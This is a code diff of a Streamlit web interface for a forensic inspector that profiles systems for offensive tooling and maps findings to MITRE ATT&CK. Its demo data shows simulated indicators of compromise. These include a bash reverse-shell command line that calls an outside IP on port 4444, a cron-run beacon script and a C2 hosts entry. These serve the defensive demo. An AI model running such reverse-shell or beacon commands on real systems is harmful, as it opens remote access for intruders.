@@ -1,6 +1,6 @@
-"""
-app.py  –  PMGP Streamlit Web Interface
-Run with:  streamlit run app.py
+﻿"""
+app.py - PMGP Streamlit Web Interface
+Run with: streamlit run app.py
 """
 
 import os
@@ -14,13 +14,13 @@ from pipeline import PipelineConfig, run_pipeline, PipelineResult
 from modules.risk_classifier import RISK_COLOURS
 
 st.set_page_config(
-    page_title="PMGP – Forensic Inspector",
-    page_icon="🔍",
+    page_title="PMGP - Forensic Inspector",
+    page_icon="PMGP",
     layout="wide",
     initial_sidebar_state="expanded",
 )
 
-RISK_EMOJI = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "🔵"}
+RISK_EMOJI = {"CRITICAL": "[CRIT]", "HIGH": "[HIGH]", "MEDIUM": "[MED]", "LOW": "[LOW]", "INFO": "[INFO]"}
 
 st.markdown("""
 <style>
@@ -42,7 +42,7 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 
-# ── Demo data factory ─────────────────────────────────────────────────────────
+#  Demo data factory 
 def _run_demo() -> PipelineResult:
     from modules.os_profiler import OSProfile, OSType, FilesystemArtefact
     from modules.tool_detector import ToolDetectionResult, DetectedTool
@@ -74,7 +74,7 @@ def _run_demo() -> PipelineResult:
             FilesystemArtefact(
                 path="root/.ssh/known_hosts",
                 artefact_type="ssh_key",
-                description="SSH known_hosts with 12 host(s) – lateral movement evidence",
+                description="SSH known_hosts with 12 host(s)  lateral movement evidence",
                 risk_level="MEDIUM",
                 snippet="192.168.10.5 ssh-rsa AAAAB3NzaC1yc2EA...",
             ),
@@ -88,14 +88,14 @@ def _run_demo() -> PipelineResult:
             FilesystemArtefact(
                 path="etc/cron.d/update-check",
                 artefact_type="cron",
-                description="Cron job file with 1 active entry – potential persistence",
+                description="Cron job file with 1 active entry  potential persistence",
                 risk_level="MEDIUM",
                 snippet="*/5 * * * * root /tmp/.hidden/beacon.sh",
             ),
             FilesystemArtefact(
                 path="etc/hosts",
                 artefact_type="hosts_mod",
-                description="/etc/hosts has 3 custom entries – possible C2 infrastructure mapping",
+                description="/etc/hosts has 3 custom entries  possible C2 infrastructure mapping",
                 risk_level="MEDIUM",
                 snippet="10.0.0.99   c2.evil.internal",
             ),
@@ -162,15 +162,15 @@ def _run_demo() -> PipelineResult:
                     ("nmap detected in process cmdline", "T1046", "Discovery"),
                 ],
                 notes=[
-                    "LD_PRELOAD set – Shared library injection – may hijack execution flow",
-                    "[T1046] nmap detected in process cmdline — python3 /tmp/.hidden/beacon.py",
+                    "LD_PRELOAD set  Shared library injection  may hijack execution flow",
+                    "[T1046] nmap detected in process cmdline  python3 /tmp/.hidden/beacon.py",
                 ],
             ),
             ProcessFinding(
                 pid=1337, comm="bash",
                 cmdline="bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
                 attacker_ips={"SSH_CONNECTION": "185.220.101.45 41234 10.0.0.5 22"},
-                notes=["Non-private IP in SSH_CONNECTION: 185.220.101.45 – potential attacker origin"],
+                notes=["Non-private IP in SSH_CONNECTION: 185.220.101.45  potential attacker origin"],
             ),
             ProcessFinding(
                 pid=8823, comm="nmap",
@@ -178,7 +178,7 @@ def _run_demo() -> PipelineResult:
                 cmdline_matches=[
                     ("nmap detected in process cmdline", "T1046", "Discovery"),
                 ],
-                notes=["[T1046] nmap detected in process cmdline — nmap -sS -p 1-65535 192.168.1.0/24"],
+                notes=["[T1046] nmap detected in process cmdline  nmap -sS -p 1-65535 192.168.1.0/24"],
             ),
         ],
         suspicious_connections=[
@@ -204,7 +204,7 @@ def _run_demo() -> PipelineResult:
         partitions=[p1, p2, p3, p4], encrypted_partitions=[p4],
         tails_data_found=True,
         notes=["GPT partition table detected",
-               "TailsData partition detected – Tails persistent storage",
+               "TailsData partition detected  Tails persistent storage",
                "Partition 4 ('TailsData'): LUKS header found (LUKS2)"],
     )
 
@@ -221,12 +221,12 @@ def _run_demo() -> PipelineResult:
     return r
 
 
-# ── Sidebar ───────────────────────────────────────────────────────────────────
+#  Sidebar 
 with st.sidebar:
-    st.markdown("## 🔍 PMGP")
+    st.markdown("## PMGP")
     st.markdown("**Passive Metadata-Graph Protocol**")
     st.markdown("---")
-    st.markdown("### 📂 Target Configuration")
+    st.markdown("### Target Configuration")
 
     analysis_mode = st.radio(
         "Analysis Mode",
@@ -266,12 +266,12 @@ with st.sidebar:
         run_btn = st.button("Run Analysis", type="primary", use_container_width=True)
 
 
-# ── Title ─────────────────────────────────────────────────────────────────────
-st.title("🔍 PMGP — Advanced OS-Aware Forensic Inspector")
-st.caption("Passive Metadata-Graph Protocol v2.0 · Non-destructive forensic analysis")
+#  Title 
+st.title("PMGP - Advanced OS-Aware Forensic Inspector")
+st.caption("Passive Metadata-Graph Protocol v2.0 | Non-destructive forensic analysis")
 
 
-# ── Welcome ───────────────────────────────────────────────────────────────────
+#  Welcome 
 if not run_btn and "last_result" not in st.session_state:
     c1, c2, c3, c4 = st.columns(4)
     c1.info("**OS Profiling**\nIdentifies Kali, BlackArch, Tails without executing binaries")
@@ -283,16 +283,16 @@ if not run_btn and "last_result" not in st.session_state:
 ### How it works
 1. **Configure** the target in the sidebar *(demo, live system, or mounted image path)*
 2. **Enable** optional stages *(live /proc analysis, disk image inspection)*
-3. **Click ▶ Run Analysis** to execute the full forensic pipeline
+3. **Click Run Analysis** to execute the full forensic pipeline
 4. **Download** the generated JSON and HTML reports
 
-> ⚠️ PMGP never executes binaries, modifies evidence, or decrypts data.  
+> PMGP never executes binaries, modifies evidence, or decrypts data.  
 > All analysis is metadata-only and fully non-destructive.
 """)
     st.stop()
 
 
-# ── Remote mode session state init ───────────────────────────────────────────
+#  Remote mode session state init 
 import time as _time
 import json as _json
 from pathlib import Path as _Path
@@ -306,6 +306,8 @@ if "remote_wait_start" not in st.session_state:
     st.session_state.remote_wait_start   = None
 if "remote_last_ts" not in st.session_state:
     st.session_state.remote_last_ts      = None
+if "remote_cached_state" not in st.session_state:
+    st.session_state.remote_cached_state = None
 
 
 def _load_remote_state():
@@ -317,7 +319,200 @@ def _load_remote_state():
         return None
 
 
-# ── Run ───────────────────────────────────────────────────────────────────────
+def _render_remote_ready_state(_remote_state, allow_wait_controls: bool) -> None:
+    _hostname    = _remote_state.get("hostname",     "unknown")
+    _timestamp   = _remote_state.get("timestamp",   "")
+    _risk_level  = _remote_state.get("overall_risk","INFO")
+    _risk_score  = _remote_state.get("risk_score",  0)
+    _os_type     = _remote_state.get("os_type",     "Unknown")
+    _confidence  = _remote_state.get("confidence",  0)
+    _tool_count  = _remote_state.get("tool_count",  0)
+    _kill_chains = _remote_state.get("kill_chains", [])
+    _summary     = _remote_state.get("summary",     [])
+    _json_report = _remote_state.get("json_report", "")
+    _html_report = _remote_state.get("html_report", "")
+    _colour      = RISK_COLOURS.get(_risk_level, "#333")
+
+    st.markdown(
+        f"<div class='risk-banner' style='background:{_colour}'>"
+        f"{RISK_EMOJI.get(_risk_level,'o')} {_risk_level} RISK - "
+        f"Score: {_risk_score}/100 | "
+        f"Host: <strong>{_hostname}</strong> | {_timestamp}</div>",
+        unsafe_allow_html=True,
+    )
+
+    for _chain in _kill_chains:
+        st.markdown(
+            f"<div class='killchain-banner'><strong>Kill chain:</strong> {_chain}</div>",
+            unsafe_allow_html=True,
+        )
+
+    _m1, _m2, _m3, _m4 = st.columns(4)
+    _m1.metric("Target Host", _hostname)
+    _m2.metric("OS Detected", _os_type.split(" ")[0])
+    _m3.metric("Confidence",  f"{int(_confidence*100)}%")
+    _m4.metric("Tools Found", _tool_count)
+
+    st.markdown("---")
+
+    _parsed = {}
+    if _json_report:
+        try: _parsed = _json.loads(_json_report)
+        except Exception: pass
+
+    _risk_items     = _parsed.get("risk_items", [])
+    _mitre_coverage = _parsed.get("mitre_coverage", [])
+    _detected_tools = _parsed.get("detected_tools", [])
+    _os_data        = _parsed.get("os_profile", {})
+    _live_data      = _parsed.get("live_analysis", {})
+    _artefacts      = _os_data.get("filesystem_artefacts", [])
+
+    (_rtab_ov, _rtab_tools, _rtab_mitre, _rtab_art,
+     _rtab_live, _rtab_items, _rtab_json, _rtab_html, _rtab_exp) = st.tabs([
+        "Overview", "Tools", "MITRE", "Artefacts",
+        "Live", "Risk Items", "JSON", "HTML", "Export",
+    ])
+
+    with _rtab_ov:
+        st.subheader(f"Executive Summary - {_hostname}")
+        for _line in _summary: st.markdown(f"- {_line}")
+        if _kill_chains:
+            st.error("**Kill chains:** " + " | ".join(_kill_chains))
+        if _os_data.get("indicators"):
+            st.markdown("---")
+            st.markdown(f"**OS:** `{_os_data.get('os_type','?')}` - {int(_os_data.get('confidence',0)*100)}% confidence")
+            for _ind in _os_data.get("indicators",[]): st.markdown(f"  - {_ind}")
+
+    with _rtab_tools:
+        st.subheader(f"Detected Tools - {len(_detected_tools)}")
+        _mi = {"package_db":"pkg","filesystem":"fs","config":"cfg"}
+        for _rk, _lbl, _em in [
+            ("high_risk","High-Risk Offensive Tooling","High-Risk"),
+            ("anonymization","Anonymization Infrastructure","Anonymization"),
+            ("dual_use","Dual-Use Utilities","Dual-Use"),
+        ]:
+            _grp = [t for t in _detected_tools if t.get("risk_level")==_rk]
+            if not _grp: continue
+            with st.expander(f"{_em} {_lbl} ({len(_grp)})", expanded=(_rk=="high_risk")):
+                for _t in _grp:
+                    _ca, _cb, _cc = st.columns([2,4,2])
+                    _ca.markdown(f"**`{_t.get('name','')}`**")
+                    _cb.markdown(f"<small>{_t.get('description','')}</small>", unsafe_allow_html=True)
+                    _mth = _t.get("detection_method","package_db")
+                    _mtime = _t.get("mtime")
+                    _atime = _t.get("atime")
+                    import datetime
+                    _time_str = ""
+                    if _mtime:
+                        _time_str += f"<br>Installed: {datetime.datetime.fromtimestamp(_mtime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                    else:
+                        _time_str += "<br>Installed: -"
+                    if _atime:
+                        _time_str += f"<br>Last Used: {datetime.datetime.fromtimestamp(_atime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                    else:
+                        _time_str += "<br>Last Used: -"
+                    _cc.markdown(
+                        f"`{_t.get('mitre_technique','').split(' ')[0]}` {_mi.get(_mth,'')} <small>{_mth}</small>"
+                        f"<div style='font-size:0.7em;color:#888'>{_time_str}</div>",
+                        unsafe_allow_html=True,
+                    )
+
+    with _rtab_mitre:
+        st.subheader("MITRE ATT&CK Coverage")
+        if _mitre_coverage:
+            _tg = {}
+            for _m in _mitre_coverage: _tg.setdefault(_m.get("tactic","Other"),[]).append(_m)
+            for _tac, _ents in _tg.items():
+                st.markdown(f"**{_tac}**")
+                for _e in _ents:
+                    _tid = _e.get("technique_id","")
+                    _url = f"https://attack.mitre.org/techniques/{_tid.replace('.','/')}/"
+                    st.markdown(f"- [`{_tid}`]({_url}) **{_e.get('technique_name','')}** - {', '.join('`'+t+'`' for t in _e.get('tools',[]))}")
+
+    with _rtab_art:
+        st.subheader(f"Filesystem Artefacts - {len(_artefacts)}")
+        _ro = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
+        for _a in sorted(_artefacts, key=lambda x: _ro.get(x.get("risk_level","LOW"),9)):
+            _lvl = _a.get("risk_level","LOW")
+            with st.expander(f"{RISK_EMOJI.get(_lvl,'.')} [{_lvl}] {_a.get('path','')}"):
+                st.markdown(_a.get("description",""))
+                if _a.get("snippet"): st.code(_a["snippet"], language="bash")
+
+    with _rtab_live:
+        st.subheader("Live Process Analysis")
+        if not _live_data:
+            st.info("No live data in this bundle.")
+        else:
+            _lc1, _lc2 = st.columns(2)
+            _lc1.metric("Processes Scanned",    _live_data.get("total_processes_scanned",0))
+            _lc2.metric("Suspicious Processes", len(_live_data.get("findings",[])))
+            for _pf in _live_data.get("findings",[]):
+                with st.expander(f"PID {_pf.get('pid')} - {_pf.get('comm','')}"):
+                    if _pf.get("cmdline"): st.code(_pf["cmdline"], language="bash")
+                    for _n in _pf.get("notes",[]): st.warning(_n)
+
+    with _rtab_items:
+        st.subheader(f"All Risk Items - {len(_risk_items)}")
+        for _lvl in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
+            _li = [i for i in _risk_items if i.get("risk_level")==_lvl]
+            if not _li: continue
+            _c = RISK_COLOURS.get(_lvl,"#888")
+            with st.expander(f"{RISK_EMOJI.get(_lvl,'')} {_lvl} ({len(_li)})", expanded=(_lvl in ("CRITICAL","HIGH"))):
+                for _item in _li:
+                    _extra = ""
+                    if _item.get("mitre_technique"):
+                        _tid2 = _item["mitre_technique"]
+                        _u2   = f"https://attack.mitre.org/techniques/{_tid2.replace('.','/')}/"
+                        _extra += f"<br><small><a href='{_u2}' target='_blank'>{_tid2}</a> | {_item.get('mitre_category','')}</small>"
+                    if _item.get("evidence"):
+                        _extra += f"<br><small>{_item['evidence']}</small>"
+                    st.markdown(
+                        f"<div style='border-left:3px solid {_c};padding:0.4rem 0.8rem;"
+                        f"margin-bottom:0.4rem;background:#fafafa;border-radius:0 4px 4px 0'>"
+                        f"<strong>{_item.get('title','')}</strong><br>"
+                        f"<span style='color:#555'>{_item.get('description','')}</span>{_extra}</div>",
+                        unsafe_allow_html=True,
+                    )
+
+    with _rtab_json:
+        st.subheader("Raw JSON")
+        if _json_report:
+            st.code(_json_report[:6000] + ("..." if len(_json_report)>6000 else ""), language="json")
+
+    with _rtab_html:
+        st.subheader("HTML Report Preview")
+        if _html_report:
+            st.components.v1.html(_html_report, height=850, scrolling=True)
+
+    with _rtab_exp:
+        _ej, _eh = st.columns(2)
+        with _ej:
+            if _json_report:
+                st.download_button("Download JSON", data=_json_report,
+                    file_name=f"pmgp_{_hostname}_{_timestamp}.json",
+                    mime="application/json", use_container_width=True)
+        with _eh:
+            if _html_report:
+                st.download_button("Download HTML", data=_html_report,
+                    file_name=f"pmgp_{_hostname}_{_timestamp}.html",
+                    mime="text/html", use_container_width=True)
+
+    if allow_wait_controls:
+        st.markdown("---")
+        _col_a, _col_b = st.columns(2)
+        with _col_a:
+            if st.button("Wait for next target", use_container_width=True):
+                if _STATE_FILE.exists(): _STATE_FILE.unlink()
+                st.session_state.remote_wait_start = _time.time()
+                st.session_state.remote_last_ts    = None
+                st.rerun()
+        with _col_b:
+            if st.button("Stop remote mode", use_container_width=True):
+                st.session_state.remote_listening = False
+                st.rerun()
+
+
+#  Run 
 if run_btn:
     if analysis_mode == "Remote (wait for collector)":
         st.session_state.remote_listening  = True
@@ -328,7 +523,7 @@ if run_btn:
             _STATE_FILE.unlink()
         st.rerun()
     elif analysis_mode == "Demo (simulated data)":
-        with st.spinner("Running PMGP demo pipeline…"):
+        with st.spinner("Running PMGP demo pipeline..."):
             result = _run_demo()
         st.session_state["last_result"] = result
     else:
@@ -346,31 +541,31 @@ if run_btn:
             save_json=save_reports,
             save_html=save_reports,
         )
-        with st.spinner("Running PMGP forensic pipeline…"):
+        with st.spinner("Running PMGP forensic pipeline..."):
             result = run_pipeline(cfg, progress_callback=_cb)
         pb.empty(); st_cap.empty()
         st.session_state["last_result"] = result
 
-# ══════════════════════════════════════════════════════════════════════════
+# 
 # REMOTE WAITING / RESULTS SCREEN
-# ══════════════════════════════════════════════════════════════════════════
-if st.session_state.remote_listening:
+# 
+if st.session_state.remote_listening and analysis_mode == "Remote (wait for collector)":
     _remote_state = _load_remote_state()
     _status = _remote_state.get("status") if _remote_state else None
 
-    SPINNERS = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
+    SPINNERS = [".", "..", "...", "...."]
     _elapsed = int(_time.time() - (st.session_state.remote_wait_start or _time.time()))
     _mins, _secs = divmod(_elapsed, 60)
     _timer = f"{_mins:02d}:{_secs:02d}"
     _spin  = SPINNERS[_elapsed % len(SPINNERS)]
 
-    # ── Stop listening button in sidebar ─────────────────────────────────
+    #  Stop listening button in sidebar 
     with st.sidebar:
-        if st.button("⏹ Stop listening", use_container_width=True):
+        if st.button("Stop listening", use_container_width=True):
             st.session_state.remote_listening = False
             st.rerun()
 
-    # ── WAITING: no data yet ─────────────────────────────────────────────
+    #  WAITING: no data yet 
     if _remote_state is None or _status == "waiting":
         st.markdown("""
 <style>
@@ -394,17 +589,17 @@ if st.session_state.remote_listening:
 </style>""", unsafe_allow_html=True)
 
         step_defs = [
-            ("📡", "Waiting for collector to connect", True),
-            ("📦", "Receiving diagnostic bundle",       False),
-            ("🔍", "Running OS profiler",              False),
-            ("🛠",  "Scanning for offensive tools",    False),
-            ("⚔",  "MITRE ATT&CK mapping",            False),
-            ("📋", "Generating forensic report",        False),
+            ("Receive", "Waiting for collector to connect", True),
+            ("Bundle", "Receiving diagnostic bundle",       False),
+            ("OS", "Running OS profiler",              False),
+            ("Tools",  "Scanning for offensive tools",    False),
+            ("MITRE",  "MITRE ATT&CK mapping",            False),
+            ("Report", "Generating forensic report",        False),
         ]
         steps_html = ""
         for _icon, _label, _active in step_defs:
             _cls    = "spulse" if _active else "swait"
-            _prefix = _spin if _active else "○"
+            _prefix = _spin if _active else "-"
             steps_html += (
                 f"<div class='rstep'><span style='font-size:1rem'>{_icon}</span>"
                 f"<span class='{_cls}'>{_prefix} {_label}</span></div>"
@@ -412,11 +607,11 @@ if st.session_state.remote_listening:
 
         st.markdown(
             f"<div class='remote-wait-card'>"
-            f"<div class='remote-wait-title'>🛰 Awaiting Target</div>"
+            f"<div class='remote-wait-title'>Awaiting Target</div>"
             f"<div class='remote-wait-sub'>Run the collector script on the target machine.<br>"
             f"This screen updates automatically.</div>"
             f"{steps_html}"
-            f"<div class='rtimer'>⏱ Waiting {_timer}</div>"
+            f"<div class='rtimer'>Waiting {_timer}</div>"
             f"</div>",
             unsafe_allow_html=True,
         )
@@ -426,25 +621,30 @@ if st.session_state.remote_listening:
         _c2.info(f"**Port**\n5000")
         _c3.info(f"**Elapsed**\n{_timer}")
 
+        if analysis_mode == "Remote (wait for collector)" and st.session_state.remote_cached_state:
+            st.markdown("---")
+            st.info("Showing the most recent completed remote report while waiting for the next target.")
+            _render_remote_ready_state(st.session_state.remote_cached_state, allow_wait_controls=False)
+
         _time.sleep(_POLL_INTERVAL)
         st.rerun()
 
-    # ── PROCESSING: bundle received, analysis running ─────────────────────
+    #  PROCESSING: bundle received, analysis running 
     elif _status == "processing":
         _hostname = _remote_state.get("hostname", "unknown")
         _stage    = _remote_state.get("stage", "")
         steps = [
-            ("📡", "Bundle received",         True),
-            ("🔍", "Running OS profiler",     _stage == "os"),
-            ("🛠",  "Scanning tools",         _stage == "tools"),
-            ("⚙",  "Live process analysis",  _stage == "live"),
-            ("⚔",  "MITRE ATT&CK mapping",   _stage == "risk"),
-            ("📋", "Generating report",        _stage == "report"),
+            ("Receive", "Bundle received",         True),
+            ("OS", "Running OS profiler",     _stage == "os"),
+            ("Tools",  "Scanning tools",         _stage == "tools"),
+            ("Live",  "Live process analysis",  _stage == "live"),
+            ("MITRE",  "MITRE ATT&CK mapping",   _stage == "risk"),
+            ("Report", "Generating report",        _stage == "report"),
         ]
         steps_html = ""
         for _icon, _label, _active in steps:
             _cls    = "spulse" if _active else "swait"
-            _prefix = _spin if _active else "✓"
+            _prefix = _spin if _active else "done"
             steps_html += (
                 f"<div class='rstep'><span>{_icon}</span>"
                 f"<span class='{_cls}'>{_prefix} {_label}</span></div>"
@@ -452,26 +652,31 @@ if st.session_state.remote_listening:
         st.markdown(
             f"<div class='remote-wait-card' style='background:#0d47a1'>"
             f"<div class='remote-wait-title'>{_spin} Analysing {_hostname}</div>"
-            f"<div class='remote-wait-sub'>Bundle received — running PMGP pipeline</div>"
+            f"<div class='remote-wait-sub'>Bundle received - running PMGP pipeline</div>"
             f"{steps_html}</div>",
             unsafe_allow_html=True,
         )
         _time.sleep(_POLL_INTERVAL)
         st.rerun()
 
-    # ── ERROR ─────────────────────────────────────────────────────────────
+    #  ERROR 
     elif _status == "error":
         st.error(f"Analysis failed for **{_remote_state.get('hostname','unknown')}**")
         st.code(_remote_state.get("error", "Unknown error"))
-        if st.button("🔄 Try again"):
+        if st.button("Try again"):
             if _STATE_FILE.exists(): _STATE_FILE.unlink()
             st.rerun()
 
-    # ── RESULTS READY ─────────────────────────────────────────────────────
+    #  RESULTS READY 
     elif _status == "ready":
         _cur_ts = _remote_state.get("timestamp")
         if _cur_ts != st.session_state.remote_last_ts:
             st.session_state.remote_last_ts = _cur_ts
+
+        st.session_state.remote_cached_state = _remote_state
+        _render_remote_ready_state(_remote_state, allow_wait_controls=True)
+        _time.sleep(_POLL_INTERVAL)
+        st.rerun()
 
         _hostname    = _remote_state.get("hostname",     "unknown")
         _timestamp   = _remote_state.get("timestamp",   "")
@@ -489,15 +694,15 @@ if st.session_state.remote_listening:
         # Risk banner
         st.markdown(
             f"<div class='risk-banner' style='background:{_colour}'>"
-            f"{RISK_EMOJI.get(_risk_level,'o')} {_risk_level} RISK — "
-            f"Score: {_risk_score}/100 · "
-            f"Host: <strong>{_hostname}</strong> · {_timestamp}</div>",
+            f"{RISK_EMOJI.get(_risk_level,'o')} {_risk_level} RISK - "
+            f"Score: {_risk_score}/100 | "
+            f"Host: <strong>{_hostname}</strong> | {_timestamp}</div>",
             unsafe_allow_html=True,
         )
 
         for _chain in _kill_chains:
             st.markdown(
-                f"<div class='killchain-banner'>⚔ <strong>Kill chain:</strong> {_chain}</div>",
+                f"<div class='killchain-banner'><strong>Kill chain:</strong> {_chain}</div>",
                 unsafe_allow_html=True,
             )
 
@@ -523,27 +728,27 @@ if st.session_state.remote_listening:
 
         (_rtab_ov, _rtab_tools, _rtab_mitre, _rtab_art,
          _rtab_live, _rtab_items, _rtab_json, _rtab_html, _rtab_exp) = st.tabs([
-            "📊 Overview", "🛠 Tools", "⚔ MITRE", "📄 Artefacts",
-            "🔬 Live", "📋 Risk Items", "🔢 JSON", "🌐 HTML", "📥 Export",
+            "Overview", "Tools", "MITRE", "Artefacts",
+            "Live", "Risk Items", "JSON", "HTML", "Export",
         ])
 
         with _rtab_ov:
-            st.subheader(f"Executive Summary — {_hostname}")
+            st.subheader(f"Executive Summary - {_hostname}")
             for _line in _summary: st.markdown(f"- {_line}")
             if _kill_chains:
                 st.error("**Kill chains:** " + " | ".join(_kill_chains))
             if _os_data.get("indicators"):
                 st.markdown("---")
-                st.markdown(f"**OS:** `{_os_data.get('os_type','?')}` — {int(_os_data.get('confidence',0)*100)}% confidence")
+                st.markdown(f"**OS:** `{_os_data.get('os_type','?')}` - {int(_os_data.get('confidence',0)*100)}% confidence")
                 for _ind in _os_data.get("indicators",[]): st.markdown(f"  - {_ind}")
 
         with _rtab_tools:
-            st.subheader(f"Detected Tools — {len(_detected_tools)}")
-            _mi = {"package_db":"📦","filesystem":"📂","config":"⚙"}
+            st.subheader(f"Detected Tools - {len(_detected_tools)}")
+            _mi = {"package_db":"pkg","filesystem":"fs","config":"cfg"}
             for _rk, _lbl, _em in [
-                ("high_risk","High-Risk Offensive Tooling","⚠️"),
-                ("anonymization","Anonymization Infrastructure","🕵️"),
-                ("dual_use","Dual-Use Utilities","🔧"),
+                ("high_risk","High-Risk Offensive Tooling","High-Risk"),
+                ("anonymization","Anonymization Infrastructure","Anonymization"),
+                ("dual_use","Dual-Use Utilities","Dual-Use"),
             ]:
                 _grp = [t for t in _detected_tools if t.get("risk_level")==_rk]
                 if not _grp: continue
@@ -553,7 +758,23 @@ if st.session_state.remote_listening:
                         _ca.markdown(f"**`{_t.get('name','')}`**")
                         _cb.markdown(f"<small>{_t.get('description','')}</small>", unsafe_allow_html=True)
                         _mth = _t.get("detection_method","package_db")
-                        _cc.markdown(f"`{_t.get('mitre_technique','').split(' ')[0]}` {_mi.get(_mth,'')} <small>{_mth}</small>", unsafe_allow_html=True)
+                        _mtime = _t.get("mtime")
+                        _atime = _t.get("atime")
+                        import datetime
+                        _time_str = ""
+                        if _mtime:
+                            _time_str += f"<br>Installed: {datetime.datetime.fromtimestamp(_mtime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                        else:
+                            _time_str += "<br>Installed: -"
+                        if _atime:
+                            _time_str += f"<br>Last Used: {datetime.datetime.fromtimestamp(_atime, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                        else:
+                            _time_str += "<br>Last Used: -"
+                        _cc.markdown(
+                            f"`{_t.get('mitre_technique','').split(' ')[0]}` {_mi.get(_mth,'')} <small>{_mth}</small>"
+                            f"<div style='font-size:0.7em;color:#888'>{_time_str}</div>",
+                            unsafe_allow_html=True,
+                        )
 
         with _rtab_mitre:
             st.subheader("MITRE ATT&CK Coverage")
@@ -565,10 +786,10 @@ if st.session_state.remote_listening:
                     for _e in _ents:
                         _tid = _e.get("technique_id","")
                         _url = f"https://attack.mitre.org/techniques/{_tid.replace('.','/')}/"
-                        st.markdown(f"- [`{_tid}`]({_url}) **{_e.get('technique_name','')}** — {', '.join('`'+t+'`' for t in _e.get('tools',[]))}")
+                        st.markdown(f"- [`{_tid}`]({_url}) **{_e.get('technique_name','')}** - {', '.join('`'+t+'`' for t in _e.get('tools',[]))}")
 
         with _rtab_art:
-            st.subheader(f"Filesystem Artefacts — {len(_artefacts)}")
+            st.subheader(f"Filesystem Artefacts - {len(_artefacts)}")
             _ro = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
             for _a in sorted(_artefacts, key=lambda x: _ro.get(x.get("risk_level","LOW"),9)):
                 _lvl = _a.get("risk_level","LOW")
@@ -585,12 +806,12 @@ if st.session_state.remote_listening:
                 _lc1.metric("Processes Scanned",    _live_data.get("total_processes_scanned",0))
                 _lc2.metric("Suspicious Processes", len(_live_data.get("findings",[])))
                 for _pf in _live_data.get("findings",[]):
-                    with st.expander(f"PID {_pf.get('pid')} — {_pf.get('comm','')}"):
+                    with st.expander(f"PID {_pf.get('pid')} - {_pf.get('comm','')}"):
                         if _pf.get("cmdline"): st.code(_pf["cmdline"], language="bash")
                         for _n in _pf.get("notes",[]): st.warning(_n)
 
         with _rtab_items:
-            st.subheader(f"All Risk Items — {len(_risk_items)}")
+            st.subheader(f"All Risk Items - {len(_risk_items)}")
             for _lvl in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
                 _li = [i for i in _risk_items if i.get("risk_level")==_lvl]
                 if not _li: continue
@@ -601,9 +822,9 @@ if st.session_state.remote_listening:
                         if _item.get("mitre_technique"):
                             _tid2 = _item["mitre_technique"]
                             _u2   = f"https://attack.mitre.org/techniques/{_tid2.replace('.','/')}/"
-                            _extra += f"<br><small>🎯 <a href='{_u2}' target='_blank'>{_tid2}</a> · {_item.get('mitre_category','')}</small>"
+                            _extra += f"<br><small><a href='{_u2}' target='_blank'>{_tid2}</a> | {_item.get('mitre_category','')}</small>"
                         if _item.get("evidence"):
-                            _extra += f"<br><small>🔎 {_item['evidence']}</small>"
+                            _extra += f"<br><small>{_item['evidence']}</small>"
                         st.markdown(
                             f"<div style='border-left:3px solid {_c};padding:0.4rem 0.8rem;"
                             f"margin-bottom:0.4rem;background:#fafafa;border-radius:0 4px 4px 0'>"
@@ -638,19 +859,24 @@ if st.session_state.remote_listening:
         st.markdown("---")
         _col_a, _col_b = st.columns(2)
         with _col_a:
-            if st.button("🔄 Wait for next target", use_container_width=True):
+            if st.button("Wait for next target", use_container_width=True):
                 if _STATE_FILE.exists(): _STATE_FILE.unlink()
                 st.session_state.remote_wait_start = _time.time()
                 st.session_state.remote_last_ts    = None
                 st.rerun()
         with _col_b:
-            if st.button("⏹ Stop remote mode", use_container_width=True):
+            if st.button("Stop remote mode", use_container_width=True):
                 st.session_state.remote_listening = False
                 st.rerun()
 
         _time.sleep(_POLL_INTERVAL)
         st.rerun()
 
+    st.stop()
+
+if analysis_mode == "Remote (wait for collector)" and st.session_state.remote_cached_state:
+    st.info("Showing the last completed remote report. Start remote mode again when you want to listen for another target.")
+    _render_remote_ready_state(st.session_state.remote_cached_state, allow_wait_controls=False)
     st.stop()
 
 
@@ -663,14 +889,14 @@ if not result.success:
     st.stop()
 
 
-# ── Results ───────────────────────────────────────────────────────────────────
+#  Results 
 rr     = result.risk_report
 colour = RISK_COLOURS.get(rr.overall_risk, "#333")
 
 st.markdown(
     f'<div class="risk-banner" style="background:{colour}">'
-    f'{RISK_EMOJI.get(rr.overall_risk,"⚪")} {rr.overall_risk} RISK — '
-    f'Score: {rr.risk_score}/100 &nbsp;·&nbsp; '
+    f'{RISK_EMOJI.get(rr.overall_risk,"INFO")} {rr.overall_risk} RISK - '
+    f'Score: {rr.risk_score}/100 | '
     f'Completed in {result.elapsed_seconds:.2f}s</div>',
     unsafe_allow_html=True,
 )
@@ -679,12 +905,12 @@ st.markdown(
 if rr.kill_chains:
     for chain in rr.kill_chains:
         st.markdown(
-            f'<div class="killchain-banner">⚔ <strong>Kill chain detected:</strong> {chain}</div>',
+            f'<div class="killchain-banner"><strong>Kill chain detected:</strong> {chain}</div>',
             unsafe_allow_html=True,
         )
 
 if result.errors:
-    with st.expander("⚠️ Pipeline warnings"):
+    with st.expander("Pipeline warnings"):
         for e in result.errors: st.warning(e)
 
 op = result.os_profile
@@ -708,37 +934,28 @@ if lr and lr.is_live_system:
 st.markdown("---")
 
 tab_os, tab_tools, tab_mitre, tab_artefacts, tab_live, tab_disk, tab_items, tab_export = st.tabs([
-    "🖥 OS Profile", "🛠 Tools", "⚔ MITRE", "📄 Artefacts",
-    "🔬 Live /proc", "💾 Disk", "📋 Risk Items", "📥 Export",
+    "OS Profile", "Tools", "MITRE", "Artefacts",
+    "Live /proc", "Disk", "Risk Items", "Export",
 ])
 
 with tab_os:
     st.subheader("Operating System Profile")
-    col1, col2 = st.columns([3, 1])
-    with col1:
-        st.markdown(f"**OS Type:** `{op.os_type.value}`")
